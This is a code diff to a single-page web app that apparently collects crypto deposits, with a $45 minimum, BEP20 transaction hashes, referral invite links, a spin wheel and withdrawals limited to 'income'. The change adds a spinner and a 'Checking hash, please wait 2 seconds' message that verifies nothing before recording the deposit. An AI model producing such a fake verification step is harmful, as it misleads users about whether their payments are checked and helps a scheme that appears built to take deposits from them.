@@ -27,6 +27,8 @@ body{font-family:Manrope,system-ui;background:#eef3f9;color:#071428}
 input{border:1px solid #d5e2f2;border-radius:12px;padding:12px 14px;width:100%;background:#fff}
 .lvl{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
 .lvl b{display:block;font-size:20px}
+  .spin-dot{width:36px;height:36px;border:3px solid #d5e2f2;border-top-color:#1a73e8;border-radius:50%;animation:sp .7s linear infinite;margin:0 auto 10px}
+@keyframes sp{to{transform:rotate(360deg)}}
 </style>
 </head>
 <body>
@@ -205,6 +207,7 @@ input{border:1px solid #d5e2f2;border-radius:12px;padding:12px 14px;width:100%;b
 <div id="pop" class="hidden fixed inset-0 bg-black/40 z-50 flex items-center justify-center p-6">
   <div class="card p-6 max-w-sm w-full text-center">
     <div class="serif text-3xl" id="pop-t"></div>
+    <div id="pop-spin" class="spin-dot hidden"></div>
     <p class="text-sm mt-2" id="pop-m"></p>
     <button class="btn w-full py-3 mt-4" onclick="closePop()">OK</button>
   </div>
@@ -224,7 +227,7 @@ function saveU(obj){localStorage.setItem("nivo_"+obj.user, JSON.stringify(obj));
 function load(name){try{return JSON.parse(localStorage.getItem("nivo_"+name)||"null")}catch(e){return null}}
 function allUsers(){var out=[]; for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i); if(k&&k.indexOf("nivo_")==0){try{out.push(JSON.parse(localStorage.getItem(k)))}catch(e){}}} return out;}
 function pop(t,m){el("pop-t").textContent=t;el("pop-m").textContent=m||"";el("pop").classList.remove("hidden")}
-function closePop(){el("pop").classList.add("hidden")}
+function closePop(){el("pop").classList.add("hidden");if(el("pop-spin"))el("pop-spin").classList.add("hidden")}
 function money(n){return Number(n||0).toFixed(2)}
 function codeOf(){var c="NIVO23456789ABCDEFGHJKMNPQRSTUVWXYZ",s="";for(var i=0;i<8;i++)s+=c.charAt(Math.floor(Math.random()*c.length));return s;}
 function showBox(id){["box-login","box-signup","box-otp","box-admin"].forEach(function(x){el(x).classList.toggle("hidden",x!==id)})}
@@ -255,7 +258,7 @@ function enterUser(){hideAll();el("app").classList.remove("hidden");drawWheel();
 function tab(id){["home","wallet","deposit","withdraw","spin","game","team","profile"].forEach(function(t){el("tab-"+t).classList.toggle("hidden",t!==id)});document.querySelectorAll(".side-btn[data-tab]").forEach(function(b){b.classList.toggle("on",b.getAttribute("data-tab")===id)});draw();}
 function copyRef(){navigator.clipboard.writeText(location.origin+location.pathname+"?ref="+u.ref);pop("Copied","Invite link copied.")}
 function copyAddr(){navigator.clipboard.writeText(ADDR).then(function(){el("copy-ok").classList.remove("hidden");pop("Copied","Address copied.")})}
-function sendDep(){if(!u){pop("Login","Sign in first");return}var box=el("dep-hash");if(!box){pop("Refresh","Close the site and open again");return}var amt=Number(el("dep-amt").value),hash=(box.value||"").trim();if(!amt||amt<45){pop("Minimum","Enter amount $45 or more");return}if(hash.length<10){pop("TX hash","Paste full BEP20 hash (10+ letters)");return}u.deps=u.deps||[];u.deps.unshift({id:"D"+Date.now(),amt:amt,st:"PENDING",t:Date.now(),file:hash});saveU(u);if(el("dep-note"))el("dep-note").textContent="PENDING — waiting for admin.";draw();pop("Pending","Deposit submitted. Status: Pending. Credit after admin approval.");}
+function sendDep(){if(!u){pop("Login","Sign in first");return}var box=el("dep-hash");if(!box){pop("Refresh","Close the site and open again");return}var amt=Number(el("dep-amt").value),hash=(box.value||"").trim();if(!amt||amt<45){pop("Minimum","Enter amount $45 or more");return}if(hash.length<10){pop("TX hash","Paste full BEP20 hash (10+ letters)");return}if(el("pop-spin"))el("pop-spin").classList.remove("hidden");pop("Checking hash","Please wait 2 seconds");setTimeout(function(){if(el("pop-spin"))el("pop-spin").classList.add("hidden");u.deps=u.deps||[];u.deps.unshift({id:"D"+Date.now(),amt:amt,st:"PENDING",t:Date.now(),file:hash});saveU(u);if(el("dep-note"))el("dep-note").textContent="PENDING — waiting for admin.";draw();pop("Pending","Deposit submitted. Status: Pending. Credit after admin approval.");},2000);}
 function saveAddr(){var a=el("wd-addr").value.trim();if(a.indexOf("0x")!==0||a.length<20){pop("Address","Valid BEP20");return}u.addr=a;saveU(u);draw();pop("Saved","Address stored");}
 function askWd(){if(!u.addr){pop("Address","Save address first");return}var amt=Number(el("wd-amt").value);if(!amt||amt>u.profit+0.0001){pop("Limit","Income only");return}u.profit-=amt;u.bal-=amt;u.wds.unshift({id:"W"+Date.now(),amt:amt,st:"PENDING",t:Date.now(),addr:u.addr});saveU(u);draw();pop("Pending","10 min after admin approval");}
 function findUser(name){return allUsers().filter(function(x){return x.user===name})[0]}
